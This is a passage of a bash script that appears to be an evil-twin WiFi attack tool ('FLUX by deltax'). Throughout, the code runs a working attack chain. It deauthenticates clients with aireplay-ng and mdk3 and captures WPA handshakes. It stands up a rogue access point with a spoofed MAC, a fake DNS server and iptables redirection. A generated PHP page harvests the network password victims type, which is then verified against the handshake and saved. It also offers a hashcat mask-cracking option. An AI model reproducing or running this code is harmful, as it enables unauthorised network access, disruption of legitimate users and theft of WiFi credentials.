echo "Conversion Complete!!..."
sleep 3
clear
top
echo "Enter the MASK you wish to use for cracking."
echo
echo "?l = abcdefghijklmnopqrstuvwxyz"
echo "?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ"
echo "?d = 0123456789"
echo "?s = !”#$%&'()*+,-./:;⇔?@[\]^_ ..."
echo
echo "?a = ?l?u?d?s"
echo
echo "Example: Apple123 = Apple?d?d?d"
echo
echo -n "--> "
read MASK
clear
top
hashcat -m 2500 -a 3 $CAPLOCATION$CAPNAME.hccap $MASK
;;
	*)
Invalid Option
;;
esac


}


function handshakelocation {

	conditional_clear

	top
	infoap
	echo
	echo -e "handshake location  (Example: $red$WORK_DIR.cap$transparent)"
	echo -e "Press ${yellow}ENTER$transparent to skip"
	echo
	echo -n "Path: "
	echo -ne "$red"
	read handshakeloc
	echo -ne "$transparent"

		if [ "$handshakeloc" = "" ]; then
			deauthforce
		else
			if [ -f "$handshakeloc" ]; then
				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
						 webinterface
					else
					echo "Corrupted handshake"
					echo
					sleep 4
					echo "you can try aircrack-ng"
					echo "You want to try to aircrack-ng instead of pyrit to check the handshake? [ENTER = NO]"
					echo

					read handshakeloc_aircrack
					echo -ne "$transparent"
					if [ "$handshakeloc_aircrack" = "" ]; then
						handshakelocation
					else
						if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
							webinterface
						else
							echo "Corrupted handshake"
							sleep 4
							handshakelocation
						fi
					fi
					fi
				else
					echo -e "${red}$general_error_1$transparent!"
					echo
					echo -e "File ${red}MAC$transparent"

					readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
						for i in "${lista_loc[@]}"; do
							echo -e "$green $(echo $i | cut -d " " -f1) $yellow$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$transparent ($green $(echo $i | cut -d "(" -f2 | cut -d "'" -f2)$transparent)"
						done

					echo -e "Host ${green}MAC$transparent"
					echo -e "$green #1: $yellow$Host_MAC$transparent ($green $Host_SSID$transparent)"
					sleep 7
					handshakelocation
				fi
			else
				echo -e "File ${red}NOT$transparent present"
				sleep 4
				handshakelocation
			fi
		fi
}

function deauthforce {

	conditional_clear

	top
	while true; do

		echo "$header_deauthforce"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" $deauthforce_option_1"
		echo -e "      "$blue"2)"$transparent" pyrit"
		echo -e "      "$blue"3)"$transparent" $general_back"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) handshakemode="normal"; askclientsel; break ;;
			2 ) handshakemode="hard"; askclientsel; break ;;
			3 ) askauth; break ;;
			* ) echo "
$general_case_error"; conditional_clear ;;
		esac
	done
}

############################################### < MENU > ###############################################






############################################# < HANDSHAKE > ############################################

# Type of deauthentication to be performed
function askclientsel {

	conditional_clear

	while true; do
		top

		echo "$header_deauthMENU"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Deauth all"
		echo -e "      "$blue"2)"$transparent" Deauth all [mdk3]"
		echo -e "      "$blue"3)"$transparent" Deauth target "
		echo -e "      "$blue"4)"$transparent" Rescan networks "
		echo -e "      "$blue"5)"$transparent" Exit"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) deauth all; break ;;
			2 ) deauth mdk3; break ;;
			3 ) deauth esp; break ;;
			4 ) killall airodump-ng &>$flux_output_device; deltax; break;;
			5 ) exitmode; break ;;
			* ) echo "
$general_case_error"; conditional_clear ;;
		esac
	done

}

#
function deauth {

	conditional_clear

	iwconfig $WIFI_MONITOR channel $Host_CHAN

	case $1 in
		all )
			DEAUTH=deauthall
			capture & $DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
		mdk3 )
			DEAUTH=deauthmdk3
			capture & $DEAUTH &
			CSVDB=$Host_MAC-01.csv
		;;
		esp )
			DEAUTH=deauthesp
			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`

			if [ $LINEAS_CLIENTES -le 5 ]; then
				DEAUTH=deauthall
				capture & $DEAUTH
				CSVDB=$Host_MAC-01.csv
				deauth

			fi

			capture
			for CLIENT in $HOST; do
				Client_MAC=`echo ${CLIENT:0:17}`
				deauthesp
			done
			$DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
	esac


	deauthMENU

}

function deauthMENU {

	while true; do
		conditional_clear

		clear
		top

		echo "$header_deauthMENU "
		echo
		echo -e "Status handshake: $Handshake_statuscheck"
		echo
		echo -e "      "$blue"1)"$transparent" $deauthMENU_option_1"
		echo -e "      "$blue"2)"$transparent" $general_back (Select another deauth method)"
		echo -e "      "$blue"3)"$transparent" Select another network"
		echo -e "      "$blue"4)"$transparent" Exit"
		echo -n '      #> '
		read yn

		case $yn in
			1 ) checkhandshake;;
			2 ) conditional_clear; askclientsel; break;;
			3 ) killall airodump-ng mdk3 aireplay-ng xterm &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
			4 ) exitmode; break;;
			* ) echo "
$general_case_error"; conditional_clear ;;
		esac

	done
}

# Capture all
function capture {

	conditional_clear
	if ! ps -A | grep -q airodump-ng; then

		rm -rf $DUMP_PATH/$Host_MAC*
		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
	fi
}

# Check the handshake before continuing
function checkhandshake {

	if [ "$handshakemode" = "normal" ]; then
		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
			wpaclean $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
			webinterface
			i=2
			break

		else
			Handshake_statuscheck="${red}Not_Found$transparent"

		fi
	elif [ "$handshakemode" = "hard" ]; then
		pyrit -r $DUMP_PATH/$Host_MAC-01.cap -o $DUMP_PATH/test.cap stripLive &>$flux_output_device

		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID-$Host_MAC.cap strip &>$flux_output_device
			webinterface
			i=2
			break

		else
			if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
				Handshake_statuscheck="${yellow}Corrupted$transparent"
			else
				Handshake_statuscheck="${red}Not_found$transparent"

			fi
		fi

		rm $DUMP_PATH/test.cap &>$flux_output_device
	fi

}

############################################# < HANDSHAKE > ############################################

# function for ssl
function certssl {
# Test if the ssl certificate is generated correcly if there is any

		if [ -f /root/server.pem ]; then
		if [ -s /root/server.pem ]; then

		webinterface
		break
	else
		conditional_clear
		top
		echo "                                       "
		echo "  Certificate invalid or not present, please choice"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
		echo -e "      "$blue"3)"$red" Exit" $transparent
		echo " "
		echo -n '      #> '
		read yn

		case $yn in
			1 ) creassl;;
			2 ) certssl;break;;
			3 ) exitmode; break;;
			* ) echo "$general_case_error"; conditional_clear
		esac
		fi
	else
		while true; do
		conditional_clear
		top
		echo "                                    	                            "
		echo "  Certificate invalid or not present, please choice"
		echo "                                       "
		echo -e "      "$blue"1)"$transparent" Create  a SSL certificate"
		echo -e "      "$blue"2)"$transparent" Search for SSl certificate" # hop to certssl check again
		echo -e "      "$blue"3)"$red" Exit" $transparent
		echo " "
		echo -n '      #> '
		read yn

		case $yn in
			1 ) creassl;;
			2 ) certssl; break;;
			3 ) exitmode; break;;
			* ) echo "$general_case_error"; conditional_clear
		esac

	done

	fi


}

# Create Self-Signed SSL Certificate
function creassl {
	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /root/server.pem -out /root/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
	certssl
}

############################################# < ATAQUE > ############################################

# Select attack strategie that will be used
function webinterface {


	chmod 400 /root/server.pem

	while true; do
		conditional_clear
		top

		infoap
		echo
		echo "$header_webinterface"
		echo

		echo -e "$blue""      1)"$transparent" Web Interface"
		echo -e "$blue""      2)"$transparent" Bruteforce"
		echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""

		echo
		echo -n "#? "
		read yn
		case $yn in
		1 ) matartodo; ConnectionRESET; selection; break;;
		2 ) matartodo; Bruteforce2; break;;
		3 ) matartodo; exitmode; break;;
		esac
	done
}

	function ConnectionRESET {

		while true; do
			conditional_clear
			top
			infoap
			echo
			echo "$header_ConnectionRESET"
			echo

			echo -e "$blue""1)"$transparent"  English     [ENG](NEUTRA)"
			echo -e "$blue""2)"$transparent"  Netgear     [ENG]"
			echo -e "$blue""3)"$transparent"  Belkin      [ENG]"
			echo -e "$blue""4)"$transparent"  Arris       [ENG]"
			echo -e "$blue""5)"$transparent"  Verizon     [ENG]"
			echo -e "$blue""6)"$transparent"  Xfinity     [ENG]"
			echo -e "$blue""7)"$transparent"  Huawei      [ENG]"
			echo -e "$blue""8)"$transparent"  Spanish     [ESP](NEUTRA)"
			echo -e "$blue""9)"$transparent"  Netgear     [ESP]"
			echo -e "$blue""10)"$transparent" Arris       [ESP]"
			echo -e "$blue""11)"$transparent" Vodafone    [ESP]"
			echo -e "$blue""12)"$transparent" Italian     [IT]"
			echo -e "$blue""13)"$transparent" French      [FR]"
			echo -e "$blue""14)"$transparent" Portuguese  [POR]"
			echo -e "$blue""15)"$transparent" German      [GER]"
			echo -e "$blue""16)"$transparent" Chinese     [ZH_CN](NEUTRA)"
			echo -e "$blue""17)"$transparent"\e[1;31m $general_back"$transparent""
			echo
			echo -n "#? "
			read fluxass
			language=${webinterfaceslenguage[$line]}

			if [ "$fluxass" = "1" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
				NEUTRA
				break

			elif [ "$fluxass" = "2" ]; then
                                NETGEAR
                                break

                        elif [ "$fluxass" = "3" ]; then
                                BELKIN
                                break

                        elif [ "$fluxass" = "4" ]; then
                                ARRIS
                                break

                        elif [ "$fluxass" = "5" ]; then
                                VERIZON
                                break

                        elif [ "$fluxass" = "6" ]; then
                                XFINITY
                                break

                                elif [ "$fluxass" = "7" ]; then
                                HUAWEI
                                break

			elif [ "$fluxass" = "8" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
				NEUTRA
				break

			elif [ "$fluxass" = "9" ]; then
                                NETGEAR2
                                break

			elif [ "$fluxass" = "10" ]; then
                                ARRIS2
                                break

                        elif [ "$fluxass" = "11" ]; then
                                VODAFONE
                                break

			elif [ "$fluxass" = "12" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
				NEUTRA
				break
			elif [ "$fluxass" = "13" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
				NEUTRA
				break
			elif [ "$fluxass" = "14" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
				NEUTRA
				break

			elif [ "$fluxass" = "15" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_GER
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_GER
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_GER
				DIALOG_WEB_OK=$DIALOG_WEB_OK_GER
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_GER
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_GER
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_GER
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_GER
				NEUTRA
				break


            elif [ "$fluxass" = "16" ]; then
				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ZH
				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ZH
				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ZH
				DIALOG_WEB_OK=$DIALOG_WEB_OK_ZH
				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ZH
				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ZH
				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ZH
				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ZH
				NEUTRA
				break


            elif [ "$fluxass" = "17" ]; then
				continue
			fi

	done
	preattack
	attack
}

# Create different settings required for the script
function preattack {

# Config HostAPD
echo "interface=$WIFI
driver=nl80211
ssid=$Host_SSID
channel=$Host_CHAN
">$DUMP_PATH/hostapd.conf

# Creates PHP
echo "<?php
error_reporting(0);

\$count_my_page = (\"$DUMP_PATH/hit.txt\");
\$hits = file(\$count_my_page);
\$hits[0] ++;
\$fp = fopen(\$count_my_page , \"w\");
fputs(\$fp , \"\$hits[0]\");
fclose(\$fp);

// Receive form Post data and Saving it in variables

\$key1 = @\$_POST['key1'];

// Write the name of text file where data will be store
\$filename = \"$DUMP_PATH/data.txt\";
\$filename2 = \"$DUMP_PATH/status.txt\";
\$intento = \"$DUMP_PATH/intento\";
\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";


// Marge all the variables with text in a single variable.
\$f_data= ''.\$key1.'';

\$pwlog = fopen(\$attemptlog, \"w\");
fwrite(\$pwlog,\"\$f_data\");
fwrite(\$pwlog,\"\n\");
fclose(\$pwlog);


if ( (strlen(\$key1) < 8) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
return;
}

if ( (strlen(\$key1) > 63) ) {
echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
return;
}


\$file = fopen(\$filename, \"w\");
fwrite(\$file,\"\$f_data\");
fwrite(\$file,\"\n\");
fclose(\$file);


\$archivo = fopen(\$intento, \"w\");
fwrite(\$archivo,\"\n\");
fclose(\$archivo);

while(1)
{

if (file_get_contents(\"\$intento\") == 2) {
	    header(\"Location:final.html\");
	    break;
	}
if (file_get_contents(\"\$intento\") == 1) {
	    header(\"Location:error.html\");
	    unlink(\$intento);
	    break;
	}

sleep(1);
}

?>" > $DUMP_PATH/data/check.php

# Config DHCP
echo "authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $RANG_IP.0 netmask 255.255.255.0 {

option broadcast-address $RANG_IP.255;
option routers $IP;
option subnet-mask 255.255.255.0;
option domain-name-servers $IP;

range $RANG_IP.100 $RANG_IP.250;

}
" >$DUMP_PATH/dhcpd.conf

#create an empty leases file
touch $DUMP_PATH/dhcpd.leases

# creates Lighttpd web-server
echo "server.document-root = \"$DUMP_PATH/data/\"

server.modules = (
  \"mod_access\",
  \"mod_alias\",
  \"mod_accesslog\",
  \"mod_fastcgi\",
  \"mod_redirect\",
  \"mod_rewrite\"
)

fastcgi.server = ( \".php\" => ((
		  \"bin-path\" => \"/usr/bin/php-cgi\",
		  \"socket\" => \"/php.socket\"
		)))

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
\".html\" => \"text/html\",
\".htm\" => \"text/html\",
\".txt\" => \"text/plain\",
\".jpg\" => \"image/jpeg\",
\".png\" => \"image/png\",
\".css\" => \"text/css\"
)

server.error-handler-404 = \"/\"

static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
index-file.names = ( \"index.htm\" )



#Redirect www.domain.com to domain.com
\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )


}

" >$DUMP_PATH/lighttpd.conf

# that redirects all DNS requests to the gateway
echo "import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
	self.dominio+=data[ini+1:ini+lon+1]+'.'
	ini+=lon+1
	lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$IP'
  print 'pyminifakeDfluxassNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()
" >$DUMP_PATH/fakedns
chmod +x $DUMP_PATH/fakedns

}

# Set up DHCP / WEB server
function routear {

	ifconfig $interfaceroutear up
	ifconfig $interfaceroutear $IP netmask 255.255.255.0

	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
	sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT

	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
	iptables -t nat -A POSTROUTING -j MASQUERADE
}

# Attack
function attack {

	if [ "$fakeapmode" = "hostapd" ]; then
		interfaceroutear=$WIFI
	elif [ "$fakeapmode" = "airbase-ng" ]; then
		interfaceroutear=at0
	fi

	handshakecheck
	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)

	if [ "$fakeapmode" = "hostapd" ]; then

		ifconfig $WIFI down
		sleep 0.4
		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
		sleep 0.4
		ifconfig $WIFI up
		sleep 0.4
	fi


	if [ $fakeapmode = "hostapd" ]; then
		killall hostapd &> $flux_output_device
		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
		elif [ $fakeapmode = "airbase-ng" ]; then
		killall airbase-ng &> $flux_output_device
		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
	fi
	sleep 5

	routear &
	sleep 3


	killall dhcpd &> $flux_output_device
	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &

	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $flux_output_device
	lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device

	killall aireplay-ng &> $flux_output_device
	killall mdk3 &> $flux_output_device
	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &

	xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
	conditional_clear

	while true; do
		top

		echo "Attack in progress .."
		echo "                                       "
		echo "      1) Choose another network"
		echo "      2) Exit"
		echo " "
		echo -n '      #> '
		read yn
		case $yn in
			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
			2 ) matartodo; exitmode; break;;
			* ) echo "
$general_case_error"; conditional_clear ;;
		esac
	done

}

# Checks the validity of the password
function handshakecheck {

	echo "#!/bin/bash

	echo > $DUMP_PATH/data.txt
	echo -n \"0\"> $DUMP_PATH/hit.txt
	echo "" >$DUMP_PATH/loggg

	tput civis
	clear

	minutos=0
	horas=0
	i=0
	timestamp=\$(date +%s)

	while true; do

	segundos=\$i
	dias=\`expr \$segundos / 86400\`
	segundos=\`expr \$segundos % 86400\`
	horas=\`expr \$segundos / 3600\`
	segundos=\`expr \$segundos % 3600\`
	minutos=\`expr \$segundos / 60\`
	segundos=\`expr \$segundos % 60\`

	if [ \"\$segundos\" -le 9 ]; then
	is=\"0\"
	else
	is=
	fi

	if [ \"\$minutos\" -le 9 ]; then
	im=\"0\"
	else
	im=
	fi

	if [ \"\$horas\" -le 9 ]; then
	ih=\"0\"
	else
	ih=
	fi">>$DUMP_PATH/handcheck

	if [ $authmode = "handshake" ]; then
		echo "if [ -f $DUMP_PATH/pwattempt.txt ]; then
		cat $DUMP_PATH/pwattempt.txt >> \"$PASSLOG_PATH/$Host_SSID-$Host_MAC.log\"
		rm -f $DUMP_PATH/pwattempt.txt
		fi

		if [ -f $DUMP_PATH/intento ]; then

		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
		echo \"2\">$DUMP_PATH/intento
		break
		else
		echo \"1\">$DUMP_PATH/intento
		fi

		fi">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		  echo "
		if [ -f $DUMP_PATH/pwattempt.txt ]; then
                cat $DUMP_PATH/pwattempt.txt >> $PASSLOG_PATH/$Host_SSID-$Host_MAC.log
                rm -f $DUMP_PATH/pwattempt.txt
                fi

		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &

		if [ -f $DUMP_PATH/intento ]; then

		if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
		echo \"2\">$DUMP_PATH/intento
		break
		else
		echo \"1\">$DUMP_PATH/intento
		fi

		fi
		">>$DUMP_PATH/handcheck
	fi

	echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )

	echo
	echo -e \"  ACCESS POINT:\"
	echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
	echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
	echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
	echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
	echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
	echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
	echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
	echo
	echo -e \"  CLIENTS ONLINE:\"

	x=0
	for cliente in \"\${CLIENTESDHCP[@]}\"; do
	  x=\$((\$x+1))
	  CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
	  CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])

	  if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
		CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
	  fi

	  CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)

	  if echo \$CLIENTE_MAC| grep -q x; then
		    CLIENTE_FABRICANTE=\"unknown\"
	  fi

	  CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')

	  echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
	done

	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck


	if [ $authmode = "handshake" ]; then
		echo "let i=\$(date +%s)-\$timestamp
		sleep 1">>$DUMP_PATH/handcheck

	elif [ $authmode = "wpa_supplicant" ]; then
		echo "sleep 5

		killall wpa_supplicant &>$flux_output_device
		killall wpa_passphrase &>$flux_output_device
		let i=\$i+5">>$DUMP_PATH/handcheck
	fi

	echo "done
	clear
	echo \"1\" > $DUMP_PATH/status.txt

	sleep 7

	killall mdk3 &>$flux_output_device
	killall aireplay-ng &>$flux_output_device
	killall airbase-ng &>$flux_output_device
	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$flux_output_device
	killall hostapd &>$flux_output_device
	killall lighttpd &>$flux_output_device
	killall dhcpd &>$flux_output_device
	killall wpa_supplicant &>$flux_output_device
	killall wpa_passphrase &>$flux_output_device

	echo \"
	FLUX $version by deltax

	SSID: $Host_SSID
	BSSID: $Host_MAC ($Host_MAC_MODEL)
	Channel: $Host_CHAN
	Security: $Host_ENC
	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
	Password: \$(cat $DUMP_PATH/data.txt)
	\" >\"$HOME/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck


	if [ $authmode = "handshake" ]; then
